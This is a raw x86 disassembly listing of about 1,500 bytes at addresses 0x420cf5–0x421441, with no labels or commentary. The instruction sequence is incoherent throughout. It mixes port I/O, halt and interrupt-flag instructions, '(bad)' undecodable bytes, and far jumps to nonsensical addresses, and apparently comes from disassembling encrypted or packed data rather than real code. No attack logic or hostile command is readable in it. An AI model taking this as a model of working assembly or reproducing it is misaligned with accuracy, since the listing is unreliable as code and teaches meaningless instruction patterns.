  420cf5:	sbb    ebx,0xffffffe2
  420cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cf9:	sub    esi,DWORD PTR [edx-0x32564227]
  420cff:	pop    edi
  420d00:	inc    ebx
  420d01:	sti    
  420d02:	xor    eax,0xbb605497
  420d07:	xchg   esp,eax
  420d08:	sbb    bl,BYTE PTR [ecx]
  420d0a:	pop    ss
  420d0b:	inc    ebx
  420d0c:	mov    dh,0x8e
  420d0e:	scas   eax,DWORD PTR es:[edi]
  420d0f:	jle    0x420d33
  420d11:	aaa    
  420d12:	push   esi
  420d13:	fistp  QWORD PTR [eax]
  420d15:	pop    edx
  420d16:	fsubr  QWORD PTR [esi+eax*8-0x4db8a33f]
  420d1d:	sbb    eax,0x956e8e77
  420d22:	cld    
  420d23:	out    dx,eax
  420d24:	aas    
  420d25:	enter  0x28d2,0x7c
  420d29:	aam    0x28
  420d2b:	xchg   esp,eax
  420d2c:	push   ebp
  420d2d:	cmp    al,0x53
  420d2f:	out    dx,eax
  420d30:	daa    
  420d31:	imul   edx,DWORD PTR [ebx],0x4996a503
  420d37:	inc    ebp
  420d38:	loope  0x420d2c
  420d3a:	js     0x420d8a
  420d3c:	pop    eax
  420d3d:	dec    esi
  420d3e:	cs in  al,0xd
  420d41:	and    al,0x1f
  420d43:	test   eax,0xf854e3bd
  420d48:	retf   0xc949
  420d4b:	jo     0x420d9c
  420d4d:	test   al,0x84
  420d4f:	pop    esp
  420d50:	adc    esi,DWORD PTR [eax+0x39]
  420d53:	xchg   esi,eax
  420d54:	inc    ecx
  420d55:	repz jmp 0x420dd3
  420d58:	sbb    al,0xdb
  420d5a:	cmp    BYTE PTR [ecx-0x34413a2d],al
  420d60:	push   ss
  420d61:	scas   eax,DWORD PTR es:[edi]
  420d62:	aas    
  420d63:	add    BYTE PTR [eax],bh
  420d65:	cmp    cl,al
  420d67:	xchg   edi,eax
  420d68:	xlat   BYTE PTR ds:[ebx]
  420d69:	fnstcw WORD PTR [ebp-0x5d20b2ec]
  420d6f:	ret    0x835c
  420d72:	fnsave [ebx+esi*2]
  420d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d76:	enter  0x623b,0xc
  420d7a:	int    0x5d
  420d7c:	mov    eax,ds:0x4e690266
  420d81:	and    ebp,DWORD PTR [ebx+edi*2+0xd]
  420d85:	push   0xffffff92
  420d87:	out    dx,eax
  420d88:	and    ebp,ecx
  420d8a:	xor    edi,0x51
  420d8d:	repnz fstp QWORD PTR [edi+0x14]
  420d91:	sbb    BYTE PTR [ecx+eiz*2],al
  420d94:	mov    edx,0x52097e58
  420d99:	loope  0x420e00
  420d9b:	mov    ah,0x65
  420d9d:	jl     0x420d97
  420d9f:	dec    esi
  420da0:	stos   DWORD PTR es:[edi],eax
  420da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420da2:	imul   ecx,ecx,0xe6bfe493
  420da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420da9:	popf   
  420daa:	and    al,dl
  420dac:	push   esp
  420dad:	sub    edi,DWORD PTR [eax]
  420daf:	dec    esp
  420db0:	add    eax,0xd48c59e4
  420db5:	(bad)  fs:[eax-0x27f1fbdf]
  420dbc:	gs cs daa 
  420dbf:	push   esp
  420dc0:	push   es
  420dc1:	pop    edx
  420dc2:	aaa    
  420dc3:	push   ds
  420dc4:	mov    bl,0x5c
  420dc6:	cld    
  420dc7:	and    ebp,eax
  420dc9:	and    al,0x51
  420dcb:	jns    0x420d6d
  420dcd:	fistp  QWORD PTR [eax-0x3b]
  420dd0:	push   es
  420dd1:	gs int3 
  420dd3:	ret    0x15e3
  420dd6:	add    ah,BYTE PTR [ebx-0x77]
  420dd9:	cdq    
  420dda:	xor    ch,BYTE PTR [edi-0x5f]
  420ddd:	cwde   
  420dde:	into   
  420ddf:	fidiv  DWORD PTR [ecx]
  420de1:	inc    ebp
  420de2:	aas    
  420de3:	pop    ss
  420de4:	fs in  al,dx
  420de6:	mov    BYTE PTR [ecx+0xf],bl
  420de9:	adc    eax,edx
  420deb:	cmc    
  420dec:	dec    esp
  420ded:	jl     0x420d85
  420def:	call   0xa25ef1fd
  420df4:	xchg   edi,eax
  420df5:	in     eax,dx
  420df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df7:	lock push ss
  420df9:	es repnz iret 
  420dfc:	in     al,0xd6
  420dfe:	adc    dl,BYTE PTR [ecx]
  420e00:	scas   al,BYTE PTR es:[edi]
  420e01:	or     edi,DWORD PTR [edx-0x4b2dd2e7]
  420e07:	adc    al,0xe8
  420e09:	mov    ecx,cs
  420e0b:	jecxz  0x420dd6
  420e0d:	test   DWORD PTR [eax],edx
  420e0f:	dec    esp
  420e10:	add    bl,bl
  420e12:	or     al,0xdb
  420e14:	pop    esp
  420e15:	outs   dx,BYTE PTR ds:[esi]
  420e16:	sub    eax,0x309b9727
  420e1b:	and    dl,al
  420e1d:	sahf   
  420e1e:	xor    ebx,DWORD PTR [esi]
  420e20:	sbb    ecx,DWORD PTR [eax+0x55f658fc]
  420e26:	test   BYTE PTR [edx+0x27],ch
  420e29:	popa   
  420e2a:	fld    QWORD PTR [ebp-0x31]
  420e2d:	ins    DWORD PTR es:[edi],dx
  420e2e:	push   ebx
  420e2f:	add    DWORD PTR [eax-0x1b7e296f],0xffffff81
  420e36:	or     al,0x5c
  420e38:	dec    ecx
  420e39:	mov    bl,0x72
  420e3b:	in     al,0x28
  420e3d:	ja     0x420e02
  420e3f:	cli    
  420e40:	sbb    bl,BYTE PTR [edx]
  420e42:	mul    esp
  420e44:	out    0x8f,al
  420e46:	das    
  420e47:	imul   esp,esp,0xffffff8b
  420e4a:	divps  xmm5,XMMWORD PTR ds:0x755abe78
  420e51:	xchg   esi,eax
  420e52:	sbb    DWORD PTR ds:0xd13b04a,ecx
  420e58:	pusha  
  420e59:	stos   DWORD PTR es:[edi],eax
  420e5a:	arpl   ax,di
  420e5c:	cmp    BYTE PTR [ecx-0x68],cl
  420e5f:	push   es
  420e60:	cmp    dh,bl
  420e62:	daa    
  420e63:	in     al,dx
  420e64:	aas    
  420e65:	sub    al,0x6c
  420e67:	sub    edi,ecx
  420e69:	imul   BYTE PTR [edx]
  420e6b:	dec    esi
  420e6c:	in     al,dx
  420e6d:	sub    BYTE PTR [ecx],ah
  420e6f:	inc    edx
  420e70:	jo     0x420edd
  420e72:	into   
  420e73:	mov    eax,0x908000a7
  420e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e79:	ret    0xebea
  420e7c:	or     bh,BYTE PTR [edi-0x5b]
  420e7f:	jl     0x420eed
  420e81:	cmp    BYTE PTR [ebx],al
  420e83:	pop    ebp
  420e84:	pop    ds
  420e85:	or     al,0x43
  420e87:	pushf  
  420e88:	add    eax,ebp
  420e8a:	pusha  
  420e8b:	dec    esi
  420e8c:	hlt    
  420e8d:	and    ah,ch
  420e8f:	scas   al,BYTE PTR es:[edi]
  420e90:	sbb    bl,0xb8
  420e93:	xchg   ecx,eax
  420e94:	js     0x420f03
  420e96:	cmp    edi,DWORD PTR [edx]
  420e98:	(bad)  
  420e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e9a:	enter  0x81e0,0xb6
  420e9e:	xchg   BYTE PTR [ebp+0x7959889e],al
  420ea4:	not    edx
  420ea6:	shr    BYTE PTR [ecx+0x29b998b0],cl
  420eac:	out    0xce,eax
  420eae:	cmp    BYTE PTR [esi],bh
  420eb0:	(bad)  
  420eb1:	xor    DWORD PTR [edi+0xa277408],esi
  420eb7:	adc    eax,0xe2c41067
  420ebd:	call   0x8c2e2057
  420ec2:	jbe    0x420ed0
  420ec4:	pop    esp
  420ec5:	fstp   QWORD PTR [esi+esi*8+0x66]
  420ec9:	fidivr DWORD PTR es:[esi]
  420ecc:	cmp    eax,0x8f332b27
  420ed1:	mov    dl,0x58
  420ed3:	nop
  420ed4:	ins    BYTE PTR es:[edi],dx
  420ed5:	jge    0x420f2d
  420ed7:	sbb    BYTE PTR [esi],cl
  420ed9:	inc    sp
  420edb:	loop   0x420f45
  420edd:	in     eax,0xcf
  420edf:	fdiv   QWORD PTR [ecx+0x8a8f140]
  420ee5:	push   ds
  420ee6:	push   esp
  420ee7:	inc    edi
  420ee8:	dec    esi
  420ee9:	xchg   edx,eax
  420eea:	push   edi
  420eeb:	push   esp
  420eec:	inc    ebp
  420eed:	mov    ecx,0x9bc4c7ed
  420ef2:	(bad)  
  420ef3:	cmp    al,0xd2
  420ef5:	push   eax
  420ef6:	retf   0x2725
  420ef9:	mov    ch,0x10
  420efb:	add    dh,BYTE PTR [edi]
  420efd:	shr    BYTE PTR ds:0x3e4f633b,0x36
  420f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f05:	and    ecx,DWORD PTR [ebp+0xf2de7a2]
  420f0b:	dec    ebx
  420f0c:	nop
  420f0d:	adc    DWORD PTR [ecx],edi
  420f0f:	xchg   esp,eax
  420f10:	inc    ecx
  420f11:	adc    eax,0x52af9aec
  420f16:	fwait
  420f17:	hlt    
  420f18:	sub    ebp,esi
  420f1a:	rol    DWORD PTR [ebx],0xd4
  420f1d:	xor    ebx,esi
  420f1f:	xchg   ebx,eax
  420f20:	adc    al,0xbe
  420f22:	fst    DWORD PTR [eax+0x44]
  420f25:	shl    DWORD PTR [edx+0x6e3da2],0xa5
  420f2c:	sub    eax,0x96372daf
  420f31:	and    edx,DWORD PTR [ebx-0x254b35f3]
  420f37:	pushf  
  420f38:	xor    BYTE PTR [edi+0x6e],bl
  420f3b:	fadd   QWORD PTR [ecx+0x4c]
  420f3e:	mov    DWORD PTR [ebp-0x4c68dc05],esp
  420f44:	jmp    0xf38e80a7
  420f49:	or     esi,esp
  420f4b:	aas    
  420f4c:	out    dx,al
  420f4d:	sub    eax,0x468412e9
  420f52:	retf   
  420f53:	jo     0x420fad
  420f55:	addr16 mov ebx,0xece77c5f
  420f5b:	mov    BYTE PTR [esi+0x58],ah
  420f5e:	lahf   
  420f5f:	leave  
  420f60:	inc    esi
  420f61:	push   esi
  420f62:	inc    ebx
  420f63:	sbb    al,0x50
  420f65:	ret    
  420f66:	cmc    
  420f67:	int    0xec
  420f69:	jg     0x420ef6
  420f6b:	test   BYTE PTR fs:[ecx+edx*4-0x59],bl
  420f70:	sub    cl,BYTE PTR [eax-0x51]
  420f73:	pop    eax
  420f74:	sahf   
  420f75:	xor    BYTE PTR [ecx+edi*1+0x66e969c9],0x6f
  420f7d:	lahf   
  420f7e:	(bad)  
  420f7f:	xor    eax,0x58308271
  420f84:	jbe    0x420ff6
  420f86:	sub    esi,DWORD PTR [eax+eiz*8]
  420f89:	cld    
  420f8a:	xor    al,0xfd
  420f8c:	or     DWORD PTR [esi],0x5b2b7163
  420f92:	pop    esi
  420f93:	mov    ds:0x28137100,eax
  420f98:	iret   
  420f99:	pushf  
  420f9a:	push   0xffffff8c
  420f9c:	and    BYTE PTR [ebx+0x31],al
  420f9f:	call   0xfb90:0xec166343
  420fa6:	imul   edx,DWORD PTR [edi],0x2e0ca72e
  420fac:	sar    DWORD PTR [esi-0x7c],cl
  420faf:	adc    eax,0xc2ff9f7
  420fb4:	pop    eax
  420fb5:	jg     0x420fcf
  420fb7:	das    
  420fb8:	test   eax,0x3fd7e43c
  420fbd:	mov    fs,edi
  420fbf:	and    dh,ah
  420fc1:	jp     0x420feb
  420fc3:	pop    ebx
  420fc4:	ins    DWORD PTR es:[edi],dx
  420fc5:	or     BYTE PTR [edi],dh
  420fc7:	mov    al,fs:0xc5d137d5
  420fcd:	clc    
  420fce:	loop   0x42101d
  420fd0:	jae    0x420f7b
  420fd2:	nop
  420fd3:	sub    eax,0x6355cbfd
  420fd8:	inc    esi
  420fd9:	(bad)  
  420fda:	mov    ah,0xa9
  420fdc:	cmp    eax,0x4e6e5bb0
  420fe1:	sbb    ebp,ebx
  420fe3:	sub    DWORD PTR [esi],ebx
  420fe5:	dec    ebp
  420fe6:	clc    
  420fe7:	mov    ds:0xba7006d3,al
  420fec:	mov    ebx,0x4c7b8b07
  420ff1:	push   es
  420ff2:	pop    ss
  420ff3:	mov    ch,BYTE PTR [esi]
  420ff5:	sub    ebx,ebp
  420ff7:	scas   al,BYTE PTR es:[edi]
  420ff8:	and    BYTE PTR [ebx+0x62],bh
  420ffb:	inc    edi
  420ffc:	aam    0x51
  420ffe:	leave  
  420fff:	loope  0x421054
  421001:	cmp    BYTE PTR [ecx],0x1
  421004:	loop   0x421057
  421006:	pop    es
  421007:	inc    esi
  421008:	jmp    0xc264:0x1e1f6d22
  42100f:	les    eax,FWORD PTR [esi]
  421011:	jmp    0x6c80:0xa17f3636
  421018:	out    dx,eax
  421019:	ins    DWORD PTR es:[edi],dx
  42101a:	cwde   
  42101b:	loope  0x421032
  42101d:	and    eax,0x305528f3
  421022:	ins    BYTE PTR es:[edi],dx
  421023:	out    0xa6,eax
  421025:	(bad)  
  421026:	mov    dl,0x25
  421028:	(bad)  
  421029:	fwait
  42102a:	imul   esi,esp,0x25
  42102d:	adc    DWORD PTR [esi+edi*4+0x48],esi
  421031:	mov    BYTE PTR [ebx+esi*1],0x45
  421035:	ret    0x75f3
  421038:	mov    edi,0xedf972c0
  42103d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42103e:	daa    
  42103f:	fidivr WORD PTR [esi+0x36]
  421042:	in     eax,0x75
  421044:	jno    0x42100a
  421046:	int3   
  421047:	sar    BYTE PTR [edi+0x25c5fc5d],cl
  42104d:	imul   edx,DWORD PTR [ebx+0x55],0xf739a73d
  421054:	or     bl,0x7d
  421057:	daa    
  421058:	outs   dx,BYTE PTR ds:[esi]
  421059:	add    dh,BYTE PTR [esi+ecx*2]
  42105c:	sub    al,0xac
  42105e:	cli    
  42105f:	stos   BYTE PTR es:[edi],al
  421060:	test   DWORD PTR [bx+si+0x2fb0],esp
  421065:	cld    
  421066:	aaa    
  421067:	dec    ecx
  421068:	mov    ch,0xe4
  42106a:	and    edi,DWORD PTR [edi+eiz*4-0x546b0a04]
  421071:	dec    edx
  421072:	xchg   ecx,eax
  421073:	cwde   
  421074:	xchg   BYTE PTR [eax],dh
  421076:	push   cs
  421077:	pop    ecx
  421078:	adc    eax,0x5ac08faf
  42107d:	jb     0x42100b
  42107f:	jl     0x4210aa
  421081:	imul   edx,DWORD PTR [ebp+0x86f6889],0x8673e3b5
  42108b:	xor    al,0x94
  42108d:	cmp    BYTE PTR [esi],al
  42108f:	push   ebx
  421090:	pop    edi
  421091:	push   es
  421092:	mov    ebp,0x38878321
  421097:	div    cl
  421099:	pusha  
  42109a:	jbe    0x421073
  42109c:	scas   eax,DWORD PTR es:[edi]
  42109d:	repnz leave 
  42109f:	inc    esi
  4210a0:	sbb    bh,BYTE PTR [esi-0x27]
  4210a3:	cdq    
  4210a4:	xchg   edi,eax
  4210a5:	inc    esp
  4210a6:	pop    eax
  4210a7:	sub    DWORD PTR [edi-0x59],edx
  4210aa:	inc    eax
  4210ab:	out    0x34,eax
  4210ad:	ja     0x421102
  4210af:	aam    0xbf
  4210b1:	arpl   sp,dx
  4210b3:	mov    esi,0x205f8550
  4210b8:	icebp  
  4210b9:	retf   
  4210ba:	pushf  
  4210bb:	cli    
  4210bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210bd:	rol    BYTE PTR [eax],cl
  4210bf:	mov    cl,0xa8
  4210c1:	sub    bh,ch
  4210c3:	ror    dl,cl
  4210c5:	pop    ebx
  4210c6:	es retf 
  4210c8:	xor    DWORD PTR [ebp-0x48],edi
  4210cb:	mov    ch,0xda
  4210cd:	add    BYTE PTR [esi-0x1c377bdb],0x2c
  4210d4:	sub    eax,0xe383894f
  4210d9:	addr16 sbb al,0xa6
  4210dc:	mov    edx,0xc8e0d014
  4210e1:	mov    bl,0xed
  4210e3:	sbb    esi,DWORD PTR [edi+edi*1-0x24]
  4210e7:	jmp    0x42108c
  4210e9:	dec    edx
  4210ea:	out    0xdd,al
  4210ec:	mov    al,0xd4
  4210ee:	inc    esp
  4210ef:	mov    ebx,ebx
  4210f1:	je     0x4210de
  4210f3:	fnstcw WORD PTR [edi]
  4210f5:	push   eax
  4210f6:	data16 and BYTE PTR ds:0x56767e59,0x85
  4210fe:	sub    eax,0x24c90b0a
  421103:	ins    DWORD PTR es:[edi],dx
  421104:	rcr    DWORD PTR [esi],0x16
  421107:	test   BYTE PTR [ecx],bl
  421109:	daa    
  42110a:	cli    
  42110b:	test   eax,0x8768f9db
  421110:	scas   al,BYTE PTR es:[edi]
  421111:	int    0xf7
  421113:	xor    dl,ch
  421115:	popf   
  421116:	in     eax,0x92
  421118:	sti    
  421119:	outs   dx,DWORD PTR ds:[esi]
  42111a:	hlt    
  42111b:	out    0x6e,al
  42111d:	dec    ecx
  42111e:	and    BYTE PTR [esi],dl
  421120:	daa    
  421121:	mov    dl,0x56
  421123:	and    DWORD PTR [eax],eax
  421125:	outs   dx,DWORD PTR ds:[esi]
  421126:	mov    ss,WORD PTR [esi-0x50]
  421129:	ja     0x421143
  42112b:	push   ds
  42112c:	or     DWORD PTR [ebx],edi
  42112e:	dec    ebx
  42112f:	inc    ebx
  421130:	cmp    DWORD PTR [ecx],edx
  421132:	mov    ch,0x6e
  421134:	shl    DWORD PTR [ecx],cl
  421136:	fadd   st,st(6)
  421138:	cmp    edi,DWORD PTR [edi+ebp*8-0xa31a87e]
  42113f:	js     0x4210e8
  421141:	pop    esi
  421142:	cmc    
  421143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421144:	adc    DWORD PTR [edi-0x23],esp
  421147:	pop    eax
  421148:	leave  
  421149:	call   0xe7783e9f
  42114e:	pop    esi
  42114f:	inc    ebx
  421150:	dec    esi
  421151:	lea    esp,[edx+0x4eb0a43b]
  421157:	fsub   DWORD PTR [ebx+esi*4-0x63]
  42115b:	jo     0x421170
  42115d:	push   ebx
  42115e:	sti    
  42115f:	sbb    al,0x9a
  421161:	or     al,0x5b
  421163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421164:	aad    0xcc
  421166:	ja     0x4211b0
  421168:	das    
  421169:	push   es
  42116a:	adc    dl,al
  42116c:	(bad)  
  42116d:	mov    ebx,0xcbdb89a4
  421172:	xchg   edi,eax
  421173:	retf   
  421174:	jns    0x4211ad
  421176:	and    DWORD PTR ds:0xe5f6679a,eax
  42117c:	cmp    DWORD PTR [ecx+ebp*4],edi
  42117f:	xor    BYTE PTR [esi-0x6],dh
  421182:	pop    eax
  421183:	cdq    
  421184:	out    0xbc,al
  421186:	(bad)  
  421187:	imul   BYTE PTR [edx+0x74da03f3]
  42118d:	(bad)  
  42118e:	xchg   ebp,eax
  42118f:	fsub   DWORD PTR [edi+0x1d]
  421192:	jns    0x42118a
  421194:	jl     0x421177
  421196:	dec    ebp
  421197:	retf   0x99d7
  42119a:	call   0xd45a:0x95f0f27d
  4211a1:	push   cs
  4211a2:	cmp    bh,BYTE PTR [edi]
  4211a4:	test   eax,0x999beb72
  4211a9:	stos   DWORD PTR es:[edi],eax
  4211aa:	lods   eax,DWORD PTR ds:[esi]
  4211ab:	xor    eax,0x48b1cb2d
  4211b0:	test   bl,0xb9
  4211b3:	pop    esi
  4211b4:	push   ebp
  4211b5:	cs sbb eax,0x5d95e3ec
  4211bb:	push   esi
  4211bc:	pop    edi
  4211bd:	gs cmp al,0x17
  4211c0:	jb     0x421162
  4211c2:	vmwrite edx,DWORD PTR [eax+0x15]
  4211c6:	jp     0x42120a
  4211c8:	sbb    esi,DWORD PTR [eax+0x7b]
  4211cb:	push   esp
  4211cc:	mov    DWORD PTR [esi-0x10abf3b6],edx
  4211d2:	popf   
  4211d3:	fistp  DWORD PTR [ecx]
  4211d5:	cdq    
  4211d6:	(bad)  
  4211d7:	jle    0x4211a4
  4211d9:	bound  ebp,QWORD PTR [esi-0x3d11b5f9]
  4211df:	jmp    0x2588:0xf975baef
  4211e6:	mov    ch,0x4f
  4211e8:	pop    edx
  4211e9:	fs leave 
  4211eb:	sbb    BYTE PTR [ebx-0x29],dh
  4211ee:	pop    eax
  4211ef:	cmp    eax,0x7e2f8c0a
  4211f4:	cmc    
  4211f5:	pusha  
  4211f6:	mov    dl,0xd3
  4211f8:	or     edx,DWORD PTR [ebp+ebp*8-0x53]
  4211fc:	enter  0x684e,0x4f
  421200:	fwait
  421201:	mov    esp,0x30acd05c
  421206:	mov    bh,0xb6
  421208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421209:	int3   
  42120a:	ror    DWORD PTR [ebx],cl
  42120c:	popf   
  42120d:	jb     0x4211eb
  42120f:	icebp  
  421210:	inc    ecx
  421211:	(bad)  
  421212:	das    
  421213:	or     DWORD PTR [edx],eax
  421215:	cmp    ebx,DWORD PTR [edx]
  421217:	cmp    bh,bl
  421219:	(bad)  
  42121a:	xchg   edi,eax
  42121b:	lods   eax,DWORD PTR ds:[esi]
  42121c:	dec    esi
  42121d:	pop    edi
  42121e:	std    
  42121f:	outs   dx,DWORD PTR cs:[si]
  421222:	mov    bh,0x31
  421224:	dec    edx
  421225:	pop    ss
  421226:	jg     0x421248
  421228:	bound  ecx,QWORD PTR [ecx+0x30a6354f]
  42122e:	inc    edx
  42122f:	sahf   
  421230:	aam    0x9d
  421232:	sub    al,0x85
  421234:	mov    eax,0x62d7b7a6
  421239:	mov    ah,0x34
  42123b:	jmp    0x421239
  42123d:	push   cs
  42123e:	mov    DWORD PTR [eax+0x4e59ad0a],esp
  421244:	adc    eax,0x9a9d1286
  421249:	cmc    
  42124a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42124b:	add    al,BYTE PTR [ebp+0x12]
  42124e:	test   al,0x5a
  421250:	xchg   BYTE PTR [esi+edx*2],cl
  421253:	icebp  
  421254:	mov    bh,0x9
  421256:	cmp    ah,dl
  421258:	xchg   esp,eax
  421259:	aad    0xac
  42125b:	or     ecx,DWORD PTR ds:[edx-0x1]
  42125f:	ficom  DWORD PTR [edx]
  421261:	pop    ebp
  421262:	add    al,BYTE PTR [ecx+0x66]
  421265:	jne    0x4212e2
  421267:	or     al,0x21
  421269:	mov    al,0x50
  42126b:	retf   0x32bf
  42126e:	adc    al,0x35
  421270:	stos   DWORD PTR es:[edi],eax
  421271:	xor    ah,BYTE PTR [ebp+0x35]
  421274:	adc    al,0x47
  421276:	sub    eax,0x53f27f65
  42127b:	sti    
  42127c:	fcom   DWORD PTR [ebx-0x1e]
  42127f:	fist   DWORD PTR [ebp-0x442a2e31]
  421285:	xor    ebp,esi
  421287:	mov    bl,0xfe
  421289:	lods   eax,DWORD PTR ds:[esi]
  42128a:	into   
  42128b:	fucomip st,st(1)
  42128d:	hlt    
  42128e:	ja     0x42130d
  421290:	mov    edx,0x683df41
  421295:	leave  
  421296:	push   esp
  421297:	jge    0x421237
  421299:	in     eax,0xec
  42129b:	test   al,0x6d
  42129d:	sub    dh,bl
  42129f:	mov    dh,0x7c
  4212a1:	push   edi
  4212a2:	and    BYTE PTR [ecx-0x44],al
  4212a5:	aam    0x5e
  4212a7:	aam    0xcd
  4212a9:	fst    QWORD PTR [ecx]
  4212ab:	mov    esp,0x3fff2427
  4212b0:	pop    esp
  4212b1:	jae    0x4212a9
  4212b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212b4:	scas   eax,DWORD PTR es:[edi]
  4212b5:	popf   
  4212b6:	mov    dl,BYTE PTR [edx+0x16]
  4212b9:	add    BYTE PTR [eax+0x53],0x2c
  4212bd:	mov    DWORD PTR [eax-0x5f],edi
  4212c0:	out    0xef,al
  4212c2:	mov    bh,0x28
  4212c4:	mov    ebx,0x889d8ad3
  4212c9:	xchg   edi,eax
  4212ca:	lea    edi,[esi-0x4e17af4]
  4212d0:	out    dx,eax
  4212d1:	out    0x3e,eax
  4212d3:	mov    WORD PTR [edi],es
  4212d5:	(bad)  
  4212d6:	xchg   edi,eax
  4212d7:	(bad)  
  4212d8:	ds cmp al,0xc3
  4212db:	call   0x6fc7:0xc175271d
  4212e2:	mul    BYTE PTR [edx-0x30bdf870]
  4212e8:	and    ebx,DWORD PTR [ebp+ebx*1+0x2]
  4212ec:	xchg   ecx,eax
  4212ed:	mov    edx,0x7b5c6363
  4212f2:	or     BYTE PTR [ebp-0x4e],bh
  4212f5:	and    ch,BYTE PTR gs:[ebp-0x74]
  4212f9:	shr    al,1
  4212fb:	les    edx,FWORD PTR [esp+esi*8-0x73174232]
  421302:	sbb    ch,BYTE PTR [esp+eax*4]
  421305:	aam    0x9e
  421307:	xchg   ebp,eax
  421308:	ins    BYTE PTR es:[edi],dx
  421309:	lods   al,BYTE PTR ds:[esi]
  42130a:	pop    es
  42130b:	push   ds
  42130c:	pop    esp
  42130d:	inc    ecx
  42130e:	push   ebx
  42130f:	mov    ebp,0x31611191
  421314:	pop    es
  421315:	push   cs
  421316:	xor    BYTE PTR [edx-0x617a4577],ch
  42131c:	fdivr  QWORD PTR [eax]
  42131e:	popa   
  42131f:	adc    eax,0x2e603099
  421324:	daa    
  421325:	dec    edx
  421326:	fcmovbe st,st(3)
  421328:	lods   eax,DWORD PTR ds:[esi]
  421329:	gs pop edx
  42132b:	jbe    0x421360
  42132d:	test   DWORD PTR [ecx-0xf],0x1651e5f6
  421334:	sub    edi,ebp
  421336:	jg     0x42130c
  421338:	inc    edi
  421339:	dec    esi
  42133a:	lods   eax,DWORD PTR ds:[esi]
  42133b:	jp     0x421357
  42133d:	pop    edi
  42133e:	jmp    esp
  421340:	enter  0x1466,0xd5
  421344:	mov    ah,0xb5
  421346:	out    dx,al
  421347:	add    edx,DWORD PTR [eax]
  421349:	add    al,cl
  42134b:	not    DWORD PTR [edx+0x76]
  42134e:	mov    dl,0x64
  421350:	sbb    al,0x6a
  421352:	sahf   
  421353:	cmc    
  421354:	mov    al,ds:0x3c62b1fa
  421359:	popf   
  42135a:	pop    edx
  42135b:	sbb    dh,BYTE PTR [esi]
  42135d:	ins    BYTE PTR es:[edi],dx
  42135e:	mov    dl,0x75
  421360:	add    eax,0xfc51a636
  421365:	mov    edx,0xc88cfa1c
  42136a:	lods   al,BYTE PTR ds:[esi]
  42136b:	adc    al,0x0
  42136d:	adc    esi,0xc144b383
  421373:	inc    ebx
  421374:	inc    esp
  421375:	or     BYTE PTR [eax+0x1fc4986],bl
  42137b:	add    al,0x8c
  42137d:	xchg   BYTE PTR [ebx+edx*4-0x56],cl
  421381:	mov    dl,0x62
  421383:	fwait
  421384:	ret    
  421385:	fidiv  DWORD PTR [edi+0x26]
  421388:	push   eax
  421389:	cmp    edi,esi
  42138b:	rcl    DWORD PTR [ebx+ecx*1-0x70],cl
  42138f:	rcl    ch,1
  421391:	cld    
  421392:	jns    0x42139b
  421394:	bnd call 0xa69b2419
  42139a:	call   0x595be659
  42139f:	hlt    
  4213a0:	push   ebp
  4213a1:	jmp    FWORD PTR [edx-0x70]
  4213a4:	cs fs jns 0x4213a0
  4213a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a9:	pop    edx
  4213aa:	sub    bl,bh
  4213ac:	mov    ds:0xd4fe3a20,eax
  4213b1:	xor    BYTE PTR [eax-0x58],al
  4213b4:	adc    edx,DWORD PTR [edx+0x32]
  4213b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213b8:	xchg   esi,eax
  4213b9:	mov    dh,0x48
  4213bb:	push   ds
  4213bc:	add    al,0x19
  4213be:	popa   
  4213bf:	fmul   DWORD PTR [ecx+0x63]
  4213c2:	push   0x907ecaf0
  4213c7:	cmp    eax,0xf4b39c72
  4213cc:	hlt    
  4213cd:	sub    al,0x40
  4213cf:	mov    eax,ds:0x54669a86
  4213d4:	adc    al,0x33
  4213d6:	xor    al,0xd7
  4213d8:	pushw  es
  4213da:	jg     0x4213b6
  4213dc:	or     edi,edi
  4213de:	outs   dx,DWORD PTR ds:[esi]
  4213df:	popa   
  4213e0:	ja     0x421370
  4213e2:	xchg   esp,eax
  4213e3:	fnstsw WORD PTR [ecx-0x68b92c40]
  4213e9:	gs cld 
  4213eb:	ror    DWORD PTR [edx],1
  4213ed:	and    BYTE PTR [edi+0x37d1a940],dl
  4213f3:	popf   
  4213f4:	les    esi,FWORD PTR [ebx]
  4213f6:	mov    ecx,0x5dd3fcd1
  4213fb:	je     0x421380
  4213fd:	adc    BYTE PTR [eax],ah
  4213ff:	out    dx,al
  421400:	mov    cl,0xa1
  421402:	xchg   al,dl
  421404:	sbb    dh,BYTE PTR [edi+0x11]
  421407:	les    ecx,FWORD PTR [eax-0x17]
  42140a:	lods   eax,DWORD PTR ds:[esi]
  42140b:	sbb    DWORD PTR [edx+0xc],ebx
  42140e:	(bad)  
  421410:	stos   DWORD PTR es:[edi],eax
  421411:	adc    ch,BYTE PTR [eax+0xc]
  421414:	imul   esi,esp,0xffffffda
  421417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421418:	lods   al,BYTE PTR ds:[esi]
  421419:	ins    DWORD PTR es:[edi],dx
  42141a:	scas   eax,DWORD PTR es:[edi]
  42141b:	retf   
  42141c:	dec    edi
  42141d:	bound  edi,QWORD PTR [ebx+edx*1]
  421420:	and    DWORD PTR [edi-0x2d57ffc1],eax
  421426:	pop    edx
  421427:	dec    dx
  421429:	and    BYTE PTR ds:[ecx+0x1a],dh
  42142d:	or     BYTE PTR [ebx],al
  42142f:	xor    eax,0xd5193ff9
  421434:	mov    bl,0x3e
  421436:	or     eax,0x72301fb4
  42143b:	ret    
  42143c:	mov    dh,0xef
  42143e:	mov    al,0x0
  421440:	pop    esi
  421441:	dec    ebx
